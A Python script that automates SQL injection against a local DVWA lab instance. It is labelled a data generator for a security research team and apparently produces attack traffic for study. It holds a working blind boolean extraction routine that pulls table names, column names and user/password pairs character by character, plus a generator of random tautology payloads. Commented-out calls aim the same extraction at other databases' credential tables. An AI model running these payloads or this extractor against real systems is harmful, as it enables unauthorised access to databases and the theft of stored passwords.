import requests
import re
from bs4 import BeautifulSoup
import hashlib
import random
import argparse
import string

url = "http://localhost/DVWA/vulnerabilities/sqli/"

payload = {
	"id": "1",
    "Submit": "Submit"
}

def send_request(url, payload, method):
    s = requests.Session()
    cookie = {
        "PHPSESSID": "6i865obsioa6a1q609q1fb543h",
        "security": "low"
    }
    if method == "GET":
        res = s.get(url, params=payload, cookies=cookie, allow_redirects=False)
    elif method == "POST":
        res = s.post(url, data=payload, cookies=cookie, allow_redirects=False)
    print(res.status_code)

    return res

def check(data):
	return re.search("First name:", data)

def blind(kolom,table,n):
    passwd = ""
    idx = 1
    count = 0
    while (True):
        soup = BeautifulSoup(send_request(url, payload, "GET").text, features="html.parser")
        lo = 1
        hi = 255
        temp = -1
        while(lo <= hi):
            # csrf = soup.find('input', {'name': '_token'}).get('value')

	        #     "password":hashlib.sha1("test").hexdigest(),
            #     "_token":csrf
            # }
            # print csrf
            
            mid = int((lo + hi) / 2)
            payload["id"] = "1' AND (select ord(substring({},{},1)) from {}) <= {} #".format(str(kolom),str(idx),str(table),str(mid))
            # print(payload['id'])
            #print "select * from users where username ='" + payload['username']
            res = send_request(url, payload, "GET")
            #print res.url
            if check(res.text):
                # res = s.get("http://192.168.0.104:5501/auth/logout.php")
                # print res.url
                print("Correct")
                hi = mid-1
                temp = mid
                print("temp: " + str(temp))
            else:
                lo = mid+1
            count += 1
            if count >= n:
                return
            soup = BeautifulSoup(res.text, features="html.parser")
               
        if (hi == 0): break
        passwd += chr(temp)
        print("Result [{}]: {}".format(table,passwd))
        idx += 1

    return passwd

def genr_taut_expr():
    # https://www.owasp.org/index.php/SQL_Injection_Cookbook_-_Oracle#SQL_Tautologies

    operators = [
        '=', '^\=', '<', '>', '<=', '>=', '<!', '>!'
    ]

    op_arr_keywords = [
        '{} {} SOME ({})', '{} {} ALL({})', '{} {} ANY ({})',
        '{} {} SOME({})', '{} {} ALL ({})', '{} {} ANY({})'
    ]

    nop_arr_keywords = [
        '{} IN ({})', '{} NOT IN ({})', '{} IN({})', '{} NOT IN({})', 
    ]

    nop_noarr_keywords = [
        '{} LIKE {}', '{} NOT LIKE {}', '{} BETWEEN {} AND {}', '{} NOT BETWEEN {} AND {}'
    ]

    op = random.choice(operators)

    charset_mode = random.randint(0,1)
    if charset_mode: # string
        A = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(3,8)))
        B = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(3,8)))
        C = [''.join(random.choice(string.ascii_letters) for i in range(random.randint(3,8))) for i in range(random.randint(1,5))]
    else: # number
        A = random.randint(1,5000)
        B = random.randint(1,5000)
        C = [random.randint(100,999) for i in range(random.randint(1,5))]
        # print(','.join(str(C)))
        # input()

    kw_mode = random.randint(0,2)
    if kw_mode == 1: # nop arr keywords
        kw = random.choice(nop_arr_keywords)
        return kw.format(A, ','.join(C) if charset_mode else ','.join(str(x) for x in C))
    elif kw_mode == 2: # nop noarr keywords
        kw = random.choice(nop_noarr_keywords)
        return kw.format(A, B, A)
    else: #op arr keywords
        kw = random.choice(op_arr_keywords)
        return kw.format(A, op, ','.join(C) if charset_mode else ','.join(str(x) for x in C))
    
def taut(n):
    count = 0
    while (True):
        payload['id'] = "1' {} {} {}".format(
            "OR" if random.randint(0,1) else "AND",
            genr_taut_expr(),
            "# " if random.randint(0,1) else "-- "
        )
        send_request(url, payload, "GET")
        count += 1
        if count >= n:
            return



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Manual Data Generator for Cyber Security Reseach Team')
    parser.add_argument('--technique', type=str, help='Specify SQLi attack technique')
    args = parser.parse_args()

    if args.technique == "inference":
        blind("group_concat(table_name)", "information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61", 800)
        blind("group_concat(column_name)", "information_schema.columns where table_name='guestbook'", 300)
        blind("group_concat(user,' ',password)", "users", 500)
    elif args.technique == "tautology":
        taut(1500)

# blind("group_concat(table_name, ' ', table_schema)", "information_schema.tables where table_schema not in ('information_schema', 'main_db', 'file_db', 'mysql', 'performance_schema') order by table_schema desc")
# blind("group_concat(table_name, ' ', table_schema)", "information_schema.tables where table_schema = 'server_db' order by table_schema desc")
# Result: files, posts, role_details, roles, users

# get column name
# blind("group_concat(column_name)", "information_schema.columns where table_name='servers'")

# get data
# blind("group_concat(name,' ',password)", "server_db.servers")
# blind("group_concat(username,' ',password)", "users")